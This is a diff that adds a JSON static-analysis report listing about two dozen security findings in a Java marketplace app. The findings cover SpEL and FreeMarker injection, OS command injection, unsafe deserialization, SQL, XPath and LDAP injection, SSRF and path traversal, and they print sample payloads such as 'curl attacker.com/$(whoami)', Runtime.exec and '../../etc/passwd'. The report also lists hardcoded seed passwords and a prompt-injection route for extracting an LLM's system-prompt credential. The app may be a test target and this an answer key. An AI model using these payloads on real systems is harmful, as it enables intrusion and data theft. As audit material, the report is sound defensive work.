@@ -1,0 +1,655 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "java.security.injection.spel-expression-injection",
+      "path": "decision/src/main/java/com/marketplace/decision/service/PromotionRuleService.java",
+      "start": {
+        "line": 19,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 26,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "discountFor() parses and evaluates an attacker-controlled string as a Spring Expression Language (SpEL) expression using a StandardEvaluationContext (full, unrestricted evaluation context). The 'formula' argument originates directly from the client-supplied PROMO_FORMULA cookie in CartController.view() (decision/src/main/java/com/marketplace/decision/web/CartController.java:75,88), which any authenticated user controls completely. SpEL with StandardEvaluationContext allows arbitrary Java method invocation (e.g. T(java.lang.Runtime).getRuntime().exec(...)), making this a remote code execution vector reachable by simply visiting /cart with a crafted cookie.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.freemarker-ssti-public",
+      "path": "decision/src/main/java/com/marketplace/decision/web/StorefrontController.java",
+      "start": {
+        "line": 85,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 93,
+        "col": 10,
+        "offset": 0
+      },
+      "extra": {
+        "message": "vendorStorefront() compiles the vendor-supplied 'vendor.getDescription()' field as a FreeMarker template and processes it with tpl.process(). A vendor manager fully controls their own description (set via VendorService.applyProfileEdits), so they can embed a FreeMarker SSTI payload (e.g. <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}) that executes on the server whenever ANY visitor (including unauthenticated/low-privileged buyers) views the public storefront page /storefront/vendors/{id}. This is a privilege-escalation RCE from vendor-manager to full server code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.freemarker-ssti-admin",
+      "path": "decision/src/main/java/com/marketplace/decision/service/AnnouncementService.java",
+      "start": {
+        "line": 46,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 47,
+        "col": 44,
+        "offset": 0
+      },
+      "extra": {
+        "message": "broadcast() compiles the admin-supplied announcement body ('templateText', from AdminController.sendAnnouncement's @RequestParam String body) directly as a FreeMarker Template and processes it, allowing arbitrary FreeMarker SSTI payloads (e.g. via freemarker.template.utility.Execute) to achieve remote code execution on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.command-injection-soffice-filename",
+      "path": "decision/src/main/java/com/marketplace/decision/csv/CsvImportService.java",
+      "start": {
+        "line": 218,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 219,
+        "col": 95,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importSpreadsheet() builds a shell command string by concatenating the attacker-controlled uploaded file name ('original', from MultipartFile.getOriginalFilename()) unescaped into a soffice conversion command, then runs it via ProcessBuilder(\"cmd\",\"/c\", commandString), which executes the full string through a shell. A filename containing shell metacharacters (e.g. \"a.xlsx\" & calc.exe or \"a.xlsx\"; rm -rf ...) injects arbitrary commands. Reachable by any vendor_manager via POST /vendor/products/import/spreadsheet.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.command-injection-soffice-sheet-arg",
+      "path": "decision/src/main/java/com/marketplace/decision/csv/CsvImportService.java",
+      "start": {
+        "line": 240,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 241,
+        "col": 88,
+        "offset": 0
+      },
+      "extra": {
+        "message": "processCatalogSheet() concatenates the GraphQL-supplied 'sheet' argument directly into a shell command string and executes it via ProcessBuilder(\"sh\",\"-c\", commandString). Any authenticated partner can send a 'sheet' value containing shell metacharacters (e.g. \"x.xlsx; curl attacker.com/$(whoami)\") to achieve OS command injection. Reachable via the GraphQL mutation processCatalogSheet in PartnerApiController.java:105-109.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.deserialization.unsafe-objectinputstream",
+      "path": "decision/src/main/java/com/marketplace/decision/csv/CsvImportService.java",
+      "start": {
+        "line": 295,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 299,
+        "col": 10,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importLegacyPack() base64-decodes the caller-supplied 'pack' path variable and feeds the raw bytes directly into ObjectInputStream.readObject() with no class allow-list or filter. Any authenticated vendor manager can submit a crafted serialized object graph (a standard Java deserialization gadget chain) via POST /vendor/products/import/legacy/{pack} to achieve remote code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-502: Deserialization of Untrusted Data"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.deserialization.jackson-polymorphic-typing",
+      "path": "decision/src/main/java/com/marketplace/decision/csv/CsvImportService.java",
+      "start": {
+        "line": 68,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 71,
+        "col": 20,
+        "offset": 0
+      },
+      "extra": {
+        "message": "catalogMapper is configured with activateDefaultTyping(LaissezFaireSubTypeValidator.instance, NON_FINAL, PROPERTY) - LaissezFaireSubTypeValidator accepts any class name, so this enables unrestricted Jackson polymorphic deserialization. It is used at importCatalogJson() (line 405: catalogMapper.readValue(feed, Object.class)) on a partner-supplied 'feed' document reachable via the GraphQL mutation importCatalog (PartnerApiController.java:97-102). An attacker can embed a @class/@type property referencing a known gadget class available on the classpath to achieve remote code execution during deserialization.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-502: Deserialization of Untrusted Data"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.authn.unverified-jwt-signature",
+      "path": "decision/src/main/java/com/marketplace/decision/csv/CsvImportService.java",
+      "start": {
+        "line": 329,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 338,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importSignedBatch() calls SignedJWT.parse(raw), which only parses the JWT structure and never calls verify()/JWSVerifier against any key - the cryptographic signature is never checked. The 'vendorRef' claim read from this unverified token is then trusted as the target vendor id for the import, and no authzService.requireOwnsVendor() check is performed. Any authenticated vendor manager can craft an arbitrary unsigned/garbage-signed JWT naming a DIFFERENT vendor's id and have decision import products into that vendor's catalogue, bypassing per-vendor authorization entirely.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.sql-injection-string-concat",
+      "path": "decision/src/main/java/com/marketplace/decision/service/PayoutService.java",
+      "start": {
+        "line": 126,
+        "col": 14,
+        "offset": 0
+      },
+      "end": {
+        "line": 126,
+        "col": 142,
+        "offset": 0
+      },
+      "extra": {
+        "message": "reconcileByProviderRef() builds a SQL query by directly concatenating the caller-supplied 'providerRef' path variable into the SQL string executed via a plain java.sql.Statement, instead of using a PreparedStatement with a bound parameter. Reachable via GET /admin/payouts/reconcile/{providerRef} (PayoutController.java:62-67). A value like ' OR '1'='1 or a UNION-based payload lets an admin-authenticated caller read or exfiltrate arbitrary data from any table in the database.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.xpath-injection-tracking",
+      "path": "decision/src/main/java/com/marketplace/decision/web/BuyerOrderController.java",
+      "start": {
+        "line": 67,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 69,
+        "col": 77,
+        "offset": 0
+      },
+      "extra": {
+        "message": "tracking() compiles an XPath expression by directly concatenating the client-supplied 'ref' query parameter into the expression string: \"//shipment[trackingNo='\" + ref + \"']\". A value such as '] | //* | //shipment[trackingNo='x lets an attacker alter the query structure to extract arbitrary nodes from the carrier feed document. Reachable via GET /buyer/orders/{id}/tracking?ref=...",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.xpath-injection-shipments-search",
+      "path": "decision/src/main/java/com/marketplace/decision/web/BuyerOrderController.java",
+      "start": {
+        "line": 92,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 93,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchShipments() builds an XPath expression by concatenating the JSON body field 'query.ref()' directly into the expression string, identical to the XPath injection in tracking(). Reachable via POST /buyer/orders/{id}/shipments/search with a JSON body { \"ref\": \"...\" }.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.injection.ldap-injection-team-filter",
+      "path": "decision/src/main/java/com/marketplace/decision/service/StaffDirectoryService.java",
+      "start": {
+        "line": 36,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 36,
+        "col": 127,
+        "offset": 0
+      },
+      "extra": {
+        "message": "agentsInTeam() concatenates the 'team' parameter directly into an LDAP search filter string without any escaping: \"(&(objectClass=person)(department=\" + team + \"))\". 'team' comes straight from the client-controlled X-Support-Team HTTP header (DashboardController.supportAgents, line 106-111). A value like *)(uid=*))(|(department=* performs LDAP filter injection, letting a support agent broaden the search to retrieve directory entries outside the intended department filter.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.access-control.missing-admin-check-audit-log",
+      "path": "decision/src/main/java/com/marketplace/decision/web/AdminController.java",
+      "start": {
+        "line": 134,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 138,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "auditLog() fetches CurrentUser u but never passes it to any authorization check (no authzService.requireAdmin/requireSupportOrAdmin call) before returning every entry from auditLogRepository directly. Spring Security is configured to permitAll() on every path (SecurityConfig.java:41) and IdentityFilter only verifies that SOME valid identity token is present, not the caller's role. As a result, any authenticated user regardless of role - including a plain BUYER - can view the full administrative audit log via GET /admin/audit-log.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.access-control.missing-admin-check-webhook-secret",
+      "path": "decision/src/main/java/com/marketplace/decision/web/AdminController.java",
+      "start": {
+        "line": 50,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 61,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "vendorDetail() never checks the caller's role (no authzService call on 'u') before, when 'integrations=true', calling webhookService.forVendor(id) and exposing it in the model. Webhook.getSecret() is the HMAC signing secret used to authenticate webhook payloads (see WebhookService.fireOrderStatusUpdated, header X-Marketplace-Signature). Any authenticated user of any role can retrieve any vendor's webhook signing secret via GET /admin/vendors/{id}?integrations=true, enabling forged webhook payloads to that vendor's integration endpoint.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.access-control.idor-parked-cart",
+      "path": "decision/src/main/java/com/marketplace/decision/web/CartController.java",
+      "start": {
+        "line": 127,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 139,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "pickUpCart() looks up a parked cart solely by the client-supplied MARKET_CART cookie value and loads its contents (including another buyer's shipping name/address, saved.shipName()/shipAddress()) into the current session without ever checking that the current CurrentUser matches saved.buyerId(). CartHandoffService.park() (CartHandoffService.java:25-29) generates references from a simple incrementing counter (\"CART-\" + sequence.incrementAndGet(), starting at 1000), which is trivially enumerable. An attacker can iterate MARKET_CART=CART-1001, CART-1002, ... to view other buyers' parked cart contents and PII.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.ssrf.fetch-arbitrary-image-url",
+      "path": "decision/src/main/java/com/marketplace/decision/service/ProductService.java",
+      "start": {
+        "line": 209,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 222,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "addImageFrom() only validates that 'sourceUrl' starts with http:// or https:// and then has the server itself issue an HTTP GET to that URL, storing the response body. There is no restriction against internal/private network ranges (e.g. 127.0.0.1, 169.254.169.254 cloud metadata, internal docker hostnames like core-mock or settlement-hub.internal). A vendor manager can set sourceUrl to an internal service address to make the decision server fetch and persist internal resources, enabling SSRF against internal infrastructure. Reachable via POST /vendor/products/{id}/images/from-address.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.path-traversal.media-manifest",
+      "path": "decision/src/main/java/com/marketplace/decision/service/MediaCatalogService.java",
+      "start": {
+        "line": 32,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 48,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewCollection() resolves each manifest line against mediaRoot with Path.resolve() but, unlike FileStorageService.resolveWithinBase(), never normalizes the result and checks it still starts with mediaRoot. A manifest line containing '../../../etc' (or an absolute path) escapes the intended media directory and lists the contents of arbitrary directories readable by the process. Reachable by any vendor manager via POST /vendor/products/{id}/images/collection.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.path-traversal.report-read",
+      "path": "decision/src/main/java/com/marketplace/decision/csv/CsvExportService.java",
+      "start": {
+        "line": 122,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 127,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "openReport() resolves the caller-supplied 'reportName' (GET /admin/exports/report?name=...) against REPORT_DIR with Path.resolve() and no normalization/containment check, unlike the pattern used in FileStorageService. A name of '../../etc/passwd' or an absolute path lets an admin-authenticated caller read arbitrary files on the host that the application process can access.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.path-traversal.report-write",
+      "path": "decision/src/main/java/com/marketplace/decision/csv/CsvExportService.java",
+      "start": {
+        "line": 107,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 116,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "archiveOrders() resolves the caller-supplied 'reportName' (from the X-Report-Name HTTP header, POST /admin/exports/archive) against REPORT_DIR with Path.resolve() and writes the export body there with no normalization/containment check. A value such as '../../../opt/app/config/application.yml' lets an admin-authenticated caller overwrite arbitrary files on the host that the application process can write to.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.misconfiguration.cors-wildcard-with-credentials",
+      "path": "decision/src/main/java/com/marketplace/decision/web/FileDownloadController.java",
+      "start": {
+        "line": 71,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 71,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "@CrossOrigin(originPatterns = \"*\", allowCredentials = \"true\") on disputeEvidence() allows any origin to make credentialed cross-origin requests to this authenticated, sensitive endpoint (dispute evidence files). Combining a wildcard origin pattern with allowCredentials=true defeats the same-origin protections credentialed CORS is meant to provide.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.xxe.jaxb-unmarshal-untrusted-xml",
+      "path": "decision/src/main/java/com/marketplace/decision/csv/CsvImportService.java",
+      "start": {
+        "line": 164,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 170,
+        "col": 85,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importCatalogFeed() unmarshals the vendor-supplied 'feedXml' string with a default JAXB Unmarshaller without disabling external entity/DTD processing (e.g. via XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES=false or a hardened SAXSource). The default JAXB SAX-based parser can resolve external entities, allowing an XXE payload in the pasted feed to read local files or trigger SSRF. Reachable via POST /vendor/products/import/feed.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.info-exposure.stacktrace-in-error-page",
+      "path": "decision/src/main/java/com/marketplace/decision/web/GlobalExceptionHandler.java",
+      "start": {
+        "line": 48,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 51,
+        "col": 77,
+        "offset": 0
+      },
+      "extra": {
+        "message": "handleGeneric() renders the raw exception and its root cause (e + \" (caused by: \" + root + \")\") directly into the user-facing error page for every unhandled exception, exposing internal exception class names, messages, and implementation details to any client that triggers a 500 error.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.secrets.hardcoded-seed-credentials",
+      "path": "decision/src/main/java/com/marketplace/decision/seed/DataSeeder.java",
+      "start": {
+        "line": 95,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 102,
+        "col": 75,
+        "offset": 0
+      },
+      "extra": {
+        "message": "DataSeeder hardcodes plaintext passwords for the admin, support, and a privileged 'integration-service' MARKETPLACE_ADMIN account directly in source ('AdminPass123!', 'SupportPass123!', 'Integration2024!'). These are committed to version control and will be used verbatim in any environment that runs this seeder with an empty users table, including a misconfigured production deployment.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.info-exposure.llm-prompt-credential-with-untrusted-input",
+      "path": "decision/src/main/java/com/marketplace/decision/service/ResolutionAssistant.java",
+      "start": {
+        "line": 32,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 46,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "review() embeds the raw 'relayCredential' secret directly into the system prompt sent to the external Anthropic API, in the same request as buyer-controlled, untrusted text (dispute.getReason(), getDescription(), and every buyer DisputeMessage body, appended unescaped into 'thread'). A buyer can craft a dispute message containing a prompt-injection payload instructing the model to reveal the system prompt (and thus the embedded relay credential) in its response text, which support agents / the UI would then display.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.info-exposure.vendor-contact-email-leak",
+      "path": "decision/src/main/java/com/marketplace/decision/web/VendorPortalController.java",
+      "start": {
+        "line": 57,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 60,
+        "col": 14,
+        "offset": 0
+      },
+      "extra": {
+        "message": "When a new vendor's chosen business name clashes with an existing one, submitOnboarding() discloses that other vendor's internal record id and billing contact email (other.getContactEmail()) to the unrelated user attempting onboarding, via the rendered error message.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.info-exposure.pii-in-logs",
+      "path": "decision/src/main/java/com/marketplace/decision/service/DisputeService.java",
+      "start": {
+        "line": 195,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 197,
+        "col": 83,
+        "offset": 0
+      },
+      "extra": {
+        "message": "addEvidence() logs the order's shipping name and full shipping address at INFO level on every dispute evidence upload (log.info(... ord.getShippingName() ... ord.getShippingAddress() ...)), persisting buyer PII into application logs that typically have broader access and weaker retention/redaction controls than the primary database.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
